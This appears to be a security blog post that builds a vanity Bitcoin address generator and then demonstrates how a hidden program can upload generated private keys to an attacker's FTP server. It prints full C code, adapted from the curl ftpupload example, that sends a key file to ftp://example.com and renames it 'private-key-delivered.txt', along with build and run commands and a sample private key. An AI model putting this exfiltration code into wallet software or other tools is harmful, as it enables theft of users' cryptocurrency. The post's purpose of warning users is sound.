# Coingecko & Agent Ftpupload create beautiful crypto wallet addresses, but keep the private key safe

<p>Over the years, a whole cult has formed in the crypto community to create beautiful addresses for crypto wallets.&nbsp;Everyone can generate a «beautiful» address for themselves, which will not only be unique, but will also contain a certain combination of letters and numbers.&nbsp;This is a very exciting and interesting process, but the risk associated with involving a third party and intercepting the private key to the crypto wallet cannot be completely ruled out.&nbsp;We have all heard about independent aggregators&nbsp;<code>CoinMarketCap</code>and&nbsp;<code>CoinGecko</code>these are the most popular platforms for tracking prices on the stock exchange, but in this article we will not consider the mechanisms and functions of these sites.&nbsp;We will talk about hidden codes in&nbsp;<code>vanitygen</code>+&nbsp;<code>oclvanitygen</code>and their rapid spread on popular sites.</p>



<h3>This is a research project created for information security purposes.</h3>



<p>Many users are not satisfied with the standard random crypto wallet addresses, and for this reason they use various&nbsp;<em>programs, utilities and plugins</em>&nbsp;to create beautiful cryptocurrency addresses.</p>



<blockquote class="wp-block-quote"><p>According to&nbsp;<a href="https://www.tadviser.ru/index.php/%D0%A1%D1%82%D0%B0%D1%82%D1%8C%D1%8F:%D0%9C%D0%BE%D1%88%D0%B5%D0%BD%D0%BD%D0%B8%D1%87%D0%B5%D1%81%D1%82%D0%B2%D0%BE_%D1%81_%D0%BA%D1%80%D0%B8%D0%BF%D1%82%D0%BE%D0%B2%D0%B0%D0%BB%D1%8E%D1%82%D0%BE%D0%B9" target="_blank" rel="noreferrer noopener"><strong><u>the TAdviser</u></strong></a>&nbsp;portal, victims are increasingly becoming victims due to the use of unverified software.</p></blockquote>



<p><code>Coingecko-VanityGen</code>is a command-line utility that is able to generate cryptocurrency addresses according to the given initial parameters.</p>



<figure class="wp-block-image"><img src="./Coingecko Agent Ftpupload create beautiful crypto wallet addresses but keep the private key safe CRYPTO DEEP TECH_files/34e41242d6925aff32d0d72314b5a6ab.gif" alt="Source code &quot;Coingecko-VanityGen&quot; for creating personalized addresses." title="Source code &quot;Coingecko-VanityGen&quot; for creating personalized addresses."><figcaption>Source code «Coingecko-VanityGen» for generating personalized addresses.</figcaption></figure>



<p>The selection of a utility is based on a probabilistic search, which takes some time.<br>The time depends on the complexity of the given pattern, computer speed and luck.&nbsp;To increase the speed of generating cryptocurrency addresses, there&nbsp;<code>oclvanitygen</code>is one that uses&nbsp;<code>OpenCL</code>compatible<code>GPU</code></p>



<p>In many of our studies, we use&nbsp;<code>Google Colab</code>and for our own review we will parse for the&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/main/12CoingeckoAgentFtpupload/Coingecko_VanityGen.ipynb" target="_blank" rel="noreferrer noopener"><strong>Coingecko-VanityGen files in the&nbsp;</strong></a><a href="https://github.com/demining/CryptoDeepTools/tree/main/12CoingeckoAgentFtpupload" target="_blank" rel="noreferrer noopener"><strong>12CoingeckoAgentFtpupload</strong></a>&nbsp;repository<a href="https://github.com/demining/CryptoDeepTools/tree/main/12CoingeckoAgentFtpupload" target="_blank" rel="noreferrer noopener"><strong></strong></a></p>



<figure class="wp-block-image"><img src="./Coingecko Agent Ftpupload create beautiful crypto wallet addresses but keep the private key safe CRYPTO DEEP TECH_files/c31270e17066e23df3a85dcf9201ec11.png" alt="Coingecko &amp; Agent Ftpupload create beautiful crypto wallet addresses, but keep the private key safe"></figure>



<p><a href="https://github.com/demining/CryptoDeepTools/blob/main/12CoingeckoAgentFtpupload/Coingecko_VanityGen.ipynb" target="_blank" rel="noreferrer noopener"><strong>Coingecko-VanityGen</strong></a><em>&nbsp;works with GPU</em>&nbsp;runtime support<code>(Google Colab)</code>and generates beautiful crypto wallet addresses for the complete aggregator list according to its own parameters<code>Coingecko</code>.</p>



<h2>How to save private keys?</h2>



<h4>To understand and understand, we will move on to the experimental part:</h4>



<p>Open&nbsp;&nbsp;<a href="https://github.com/demining/TerminalGoogleColab" target="_blank" rel="noreferrer noopener"><strong>[TerminalGoogleColab]</strong></a>&nbsp;.</p>



<p><a href="https://github.com/demining/CryptoDeepTools/tree/main/12CoingeckoAgentFtpupload" target="_blank" rel="noreferrer noopener"><strong>Let’s use the «12CoingeckoAgentFtpupload»</strong></a>&nbsp;repository&nbsp;.</p>



<pre class="wp-block-code"><code>git clone https://github.com/demining/CryptoDeepTools.git

cd CryptoDeepTools/12CoingeckoAgentFtpupload/

ls</code></pre>



<figure class="wp-block-image"><img src="./Coingecko Agent Ftpupload create beautiful crypto wallet addresses but keep the private key safe CRYPTO DEEP TECH_files/2c8a04acb83af8dbc6ab3cd8345d76ca.png" alt="Coingecko &amp; Agent Ftpupload create beautiful crypto wallet addresses, but keep the private key safe"></figure>



<h4>Update and install g++ libgmp3-dev libmpfr-dev</h4>



<pre class="wp-block-code"><code>apt-get update

sudo apt-get install g++ -y

sudo apt-get install libgmp3-dev libmpfr-dev -y
</code></pre>



<figure class="wp-block-image"><img src="./Coingecko Agent Ftpupload create beautiful crypto wallet addresses but keep the private key safe CRYPTO DEEP TECH_files/12c340f1b2a7b2efbefb1a56992bc088.png" alt="Coingecko &amp; Agent Ftpupload create beautiful crypto wallet addresses, but keep the private key safe"></figure>



<h3>Assembly:</h3>



<pre class="wp-block-code"><code>make</code></pre>



<figure class="wp-block-image"><img src="./Coingecko Agent Ftpupload create beautiful crypto wallet addresses but keep the private key safe CRYPTO DEEP TECH_files/4732a29981ca60c43d3b3ffa72b0070a.png" alt="Coingecko &amp; Agent Ftpupload create beautiful crypto wallet addresses, but keep the private key safe"></figure>



<p>Let’s run the command:&nbsp;<code>ls</code>and we see that it&nbsp;<code>coingeckogen</code>was created successfully!</p>



<figure class="wp-block-image"><img src="./Coingecko Agent Ftpupload create beautiful crypto wallet addresses but keep the private key safe CRYPTO DEEP TECH_files/536dbd98fdb65d09d385edb6a189b243.png" alt="Coingecko &amp; Agent Ftpupload create beautiful crypto wallet addresses, but keep the private key safe"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Run LIST and check all existing cryptocurrencies from the CoinGecko aggregator</h2>



<pre class="wp-block-code"><code>./coingeckogen -C LIST</code></pre>



<figure class="wp-block-image"><img src="./Coingecko Agent Ftpupload create beautiful crypto wallet addresses but keep the private key safe CRYPTO DEEP TECH_files/71c19ecc127df91b9699a36912163241.png" alt="Coingecko &amp; Agent Ftpupload create beautiful crypto wallet addresses, but keep the private key safe"></figure>



<figure class="wp-block-image"><img src="./Coingecko Agent Ftpupload create beautiful crypto wallet addresses but keep the private key safe CRYPTO DEEP TECH_files/6cc0b94da08c62b232bd8b834a3c961e.png" alt="Coingecko &amp; Agent Ftpupload create beautiful crypto wallet addresses, but keep the private key safe"></figure>



<figure class="wp-block-image"><img src="./Coingecko Agent Ftpupload create beautiful crypto wallet addresses but keep the private key safe CRYPTO DEEP TECH_files/996e38fb3056196aae14f10891073759.png" alt="Coingecko &amp; Agent Ftpupload create beautiful crypto wallet addresses, but keep the private key safe"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s run «coingeckogen» and generate a Bitcoin Address with the prefix «1DEEP»:</h2>



<pre class="wp-block-code"><code>./coingeckogen 1DEEP</code></pre>



<figure class="wp-block-image"><img src="./Coingecko Agent Ftpupload create beautiful crypto wallet addresses but keep the private key safe CRYPTO DEEP TECH_files/c29ced31748d6f781e880ba78944402b.png" alt="Coingecko &amp; Agent Ftpupload create beautiful crypto wallet addresses, but keep the private key safe"></figure>



<pre class="wp-block-code"><code>Pattern: 1DEEP
Address: 1DEEPQxozZXeUmuVZxKb7JjHq28DhX99AG
Privkey: 5JdG1jvsDgHrS8E8NpRLabzrA1tCbR6ePp9zvv1q1dV6efpSqMH
crypto &gt; </code></pre>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a>&nbsp;</strong>&nbsp;and&nbsp;&nbsp;check:</p>



<figure class="wp-block-image"><img src="./Coingecko Agent Ftpupload create beautiful crypto wallet addresses but keep the private key safe CRYPTO DEEP TECH_files/c561ed0511d29e5195c4178485704918.png" alt="bitaddress" title="bitaddress"><figcaption>bitaddress</figcaption></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Why can compiled programs reveal private keys?</h2>



<figure class="wp-block-image"><img src="./Coingecko Agent Ftpupload create beautiful crypto wallet addresses but keep the private key safe CRYPTO DEEP TECH_files/0ecd352b7014684d9a22de6b041033c4.png" alt="www.securitylab.ru/news/531888.php" title="www.securitylab.ru/news/531888.php"><figcaption>www.securitylab.ru/news/531888.php</figcaption></figure>



<p>You can read the article in the information portal&nbsp;<a href="https://www.securitylab.ru/news/531888.php" target="_blank" rel="noreferrer noopener"><strong>SecurityLab</strong></a></p>



<h3>A secret code can be sewn into the source code of the program:</h3>



<p>Pay attention to the&nbsp;<a href="https://curl.se/libcurl/c/ftpupload.html" target="_blank" rel="noreferrer noopener"><strong>ftpupload.c code</strong></a></p>



<blockquote class="wp-block-quote"><p><a href="https://linuxcookbook.ru/articles/komanda-curl-linux#:~:text=%D0%9A%D0%BE%D0%BC%D0%B0%D0%BD%D0%B4%D0%B0%20curl%20%D0%B2%20Linux&amp;text=%D0%9A%D0%BE%D0%BC%D0%B0%D0%BD%D0%B4%D0%B0%20curl%20%D0%BF%D1%80%D0%B5%D0%B4%D0%BD%D0%B0%D0%B7%D0%BD%D0%B0%D1%87%D0%B5%D0%BD%D0%B0%20%D0%B4%D0%BB%D1%8F%20%D0%BF%D0%B5%D1%80%D0%B5%D0%B4%D0%B0%D1%87%D0%B8,%D0%BF%D1%80%D0%BE%D1%82%D0%BE%D0%BA%D0%BE%D0%BB%D0%BE%D0%B2%20%D0%B8%20%D0%B5%D1%91%20%D0%B2%D0%BE%D0%B7%D0%BC%D0%BE%D0%B6%D0%BD%D0%BE%D1%81%D1%82%D0%B8%20%D0%BE%D0%B3%D1%80%D0%BE%D0%BC%D0%BD%D1%8B." target="_blank" rel="noreferrer noopener"><strong>cURL</strong>&nbsp;</a>is a cross-platform command-line utility that allows you to interact with many different servers over many different protocols with the syntax<code>URL</code>.</p></blockquote>



<p>This code can send private keys to&nbsp;<code>FTP - сервер</code>&nbsp;<em>an attacker</em></p>



<pre class="wp-block-code"><code>/***************************************************************************
 *                                  _   _ ____  _
 *  Project                     ___| | | |  _ \| |
 *                             / __| | | | |_) | |
 *                            | (__| |_| |  _ &lt;| |___
 *                             \___|\___/|_| \_\_____|
 *
 * Copyright (C) 1998 - 2022, Daniel Stenberg, &lt;daniel@haxx.se&gt;, et al.
 *
 * This software is licensed as described in the file COPYING, which
 * you should have received as part of this distribution. The terms
 * are also available at https://curl.se/docs/copyright.html.
 *
 * You may opt to use, copy, modify, merge, publish, distribute and/or sell
 * copies of the Software, and permit persons to whom the Software is
 * furnished to do so, under the terms of the COPYING file.
 *
 * This software is distributed on an "AS IS" basis, WITHOUT WARRANTY OF ANY
 * KIND, either express or implied.
 *
 * SPDX-License-Identifier: curl
 *
 ***************************************************************************/
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
 
#include &lt;curl/curl.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#ifdef WIN32
#include &lt;io.h&gt;
#else
#include &lt;unistd.h&gt;
#endif
 
/* &lt;DESC&gt;
 * Performs an FTP upload and renames the file just after a successful
 * transfer.
 * &lt;/DESC&gt;
 */
 
#define LOCAL_FILE      "/tmp/Result.txt"
#define UPLOAD_FILE_AS  "Result.txt"
#define REMOTE_URL      "ftp://example.com/"  UPLOAD_FILE_AS
#define RENAME_FILE_TO  "private-key-delivered.txt"
 
/* NOTE: if you want this example to work on Windows with libcurl as a
   DLL, you MUST also provide a read callback with CURLOPT_READFUNCTION.
   Failing to do so will give you a crash since a DLL may not use the
   variable's memory when passed in to it from an app like this. */
static size_t read_callback(char *ptr, size_t size, size_t nmemb, void *stream)
{
  unsigned long nread;
  /* in real-world cases, this would probably get this data differently
     as this fread() stuff is exactly what the library already would do
     by default internally */
  size_t retcode = fread(ptr, size, nmemb, stream);
 
  if(retcode &gt; 0) {
    nread = (unsigned long)retcode;
    fprintf(stderr, "*** We read %lu bytes from file\n", nread);
  }
 
  return retcode;
}
 
int main(void)
{
  CURL *curl;
  CURLcode res;
  FILE *hd_src;
  struct stat file_info;
  unsigned long fsize;
 
  struct curl_slist *headerlist = NULL;
  static const char buf_1 [] = "RNFR " UPLOAD_FILE_AS;
  static const char buf_2 [] = "RNTO " RENAME_FILE_TO;
 
  /* get the file size of the local file */
  if(stat(LOCAL_FILE, &amp;file_info)) {
    printf("Couldn't open '%s': %s\n", LOCAL_FILE, strerror(errno));
    return 1;
  }
  fsize = (unsigned long)file_info.st_size;
 
  printf("Local file size: %lu bytes.\n", fsize);
 
  /* get a FILE * of the same file */
  hd_src = fopen(LOCAL_FILE, "rb");
 
  /* In windows, this will init the winsock stuff */
  curl_global_init(CURL_GLOBAL_ALL);
 
  /* get a curl handle */
  curl = curl_easy_init();
  if(curl) {
    /* build a list of commands to pass to libcurl */
    headerlist = curl_slist_append(headerlist, buf_1);
    headerlist = curl_slist_append(headerlist, buf_2);
 
    /* we want to use our own read function */
    curl_easy_setopt(curl, CURLOPT_READFUNCTION, read_callback);
 
    /* enable uploading */
    curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
 
    /* specify target */
    curl_easy_setopt(curl, CURLOPT_URL, REMOTE_URL);
 
    /* pass in that last of FTP commands to run after the transfer */
    curl_easy_setopt(curl, CURLOPT_POSTQUOTE, headerlist);
 
    /* now specify which file to upload */
    curl_easy_setopt(curl, CURLOPT_READDATA, hd_src);
 
    /* Set the size of the file to upload (optional).  If you give a *_LARGE
       option you MUST make sure that the type of the passed-in argument is a
       curl_off_t. If you use CURLOPT_INFILESIZE (without _LARGE) you must
       make sure that to pass in a type 'long' argument. */
    curl_easy_setopt(curl, CURLOPT_INFILESIZE_LARGE,
                     (curl_off_t)fsize);
 
    /* Now run off and do what you have been told! */
    res = curl_easy_perform(curl);
    /* Check for errors */
    if(res != CURLE_OK)
      fprintf(stderr, "curl_easy_perform() failed: %s\n",
              curl_easy_strerror(res));
 
    /* clean up the FTP commands list */
    curl_slist_free_all(headerlist);
 
    /* always cleanup */
    curl_easy_cleanup(curl);
  }
  fclose(hd_src); /* close the local file */
 
  curl_global_cleanup();
  return 0;
}</code></pre>



<blockquote class="wp-block-quote"><p><strong>For the test , upload the&nbsp;</strong><a href="https://curl.se/libcurl/c/ftpupload.html" target="_blank" rel="noreferrer noopener"><strong>ftpupload.c</strong></a><strong>&nbsp;file to the&nbsp;</strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/12CoingeckoAgentFtpupload" target="_blank" rel="noreferrer noopener"><strong>“12CoingeckoAgentFtpupload” directory</strong></a></p></blockquote>



<h2>Compile Agent Ftpupload:</h2>



<pre class="wp-block-code"><code>gcc -o agentftpupload ftpupload.c -lcurl</code></pre>



<figure class="wp-block-image"><img src="./Coingecko Agent Ftpupload create beautiful crypto wallet addresses but keep the private key safe CRYPTO DEEP TECH_files/f380920921ca4e9c07f12229c570cf8a.png" alt="Coingecko &amp; Agent Ftpupload create beautiful crypto wallet addresses, but keep the private key safe"></figure>



<h2>Access rights:</h2>



<pre class="wp-block-code"><code>chmod +x agentftpupload</code></pre>



<figure class="wp-block-image"><img src="./Coingecko Agent Ftpupload create beautiful crypto wallet addresses but keep the private key safe CRYPTO DEEP TECH_files/565fc6324d29d9107f0e33be842f2088.png" alt="Coingecko &amp; Agent Ftpupload create beautiful crypto wallet addresses, but keep the private key safe"></figure>



<pre class="wp-block-code"><code>./agentftpupload</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3>The process of intercepting a private key:</h3>



<blockquote class="wp-block-quote"><p>As we said above, in order to understand how the private key is intercepted, let’s run all the commands from the&nbsp;<a href="https://github.com/demining/CryptoDeepTools/tree/main/12CoingeckoAgentFtpupload" target="_blank" rel="noreferrer noopener"><em><u>source code</u></em></a>&nbsp;step by step .&nbsp;To do this, we will create a test server with a «cryptodeeptech» directory:</p></blockquote>



<figure class="wp-block-image"><img src="./Coingecko Agent Ftpupload create beautiful crypto wallet addresses but keep the private key safe CRYPTO DEEP TECH_files/74166834fa8f6d6dc59f0ca2cc8bed1b.gif" alt="The process of intercepting a private key" title="The process of intercepting a private key"><figcaption>The process of intercepting a private key</figcaption></figure>



<h2>As we can see from the demo, the following file was uploaded to the test server: private-key-delivered.txt</h2>



<blockquote class="wp-block-quote"><p><code>private-key-delivered.txt</code>is a file that contains the private keys of the software user.</p></blockquote>



<p><em>The whole process is hidden from the user</em>&nbsp;.</p>



<h2>We highly recommend:</h2>



<ul><li>use only proven software;</li><li>see the source code;</li><li>do the assembly yourself;</li><li>do an update;</li></ul>



<p>This video was created for the&nbsp;&nbsp;<a href="https://cryptodeep.ru/" target="_blank" rel="noreferrer noopener"><strong>CRYPTO DEEP TECH</strong></a>&nbsp;portal &nbsp;to ensure the financial security of data and cryptography on elliptic curves&nbsp;&nbsp;<code>secp256k1</code>&nbsp;against weak signatures&nbsp;&nbsp;<code>ECDSA</code>&nbsp;in cryptocurrency&nbsp;<code>BITCOIN</code></p>



<p><a href="https://github.com/demining/CryptoDeepTools/tree/main/12CoingeckoAgentFtpupload" target="_blank" rel="noreferrer noopener"><strong><u>Source</u></strong></a></p>



<p><a href="https://t.me/cryptodeeptech"><strong>Telegram</strong></a><strong>&nbsp;:&nbsp;&nbsp;</strong><a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener"><strong><u>https://t.me/cryptodeeptech</u></strong></a></p>



<p><strong><a href="https://youtu.be/sB91EE-1mJo" target="_blank" rel="noreferrer noopener">Video: https://youtu.be/sB91EE-1mJo</a></strong></p>



<p><a href="https://cryptodeep.ru/coingecko-agent-ftpupload" target="_blank" rel="noreferrer noopener"><strong>Source: https://cryptodeep.ru/coingecko-agent-ftpupload</strong></a></p>
	</div><!-- .entry-content -->

---


|  | Donation Address |
| --- | --- |
| ♥ __BTC__ | 1Lw2gTnMpxRUNBU85Hg4ruTwnpUPKdf3nV |
| ♥ __ETH__ | 0xaBd66CF90898517573f19184b3297d651f7b90bf |


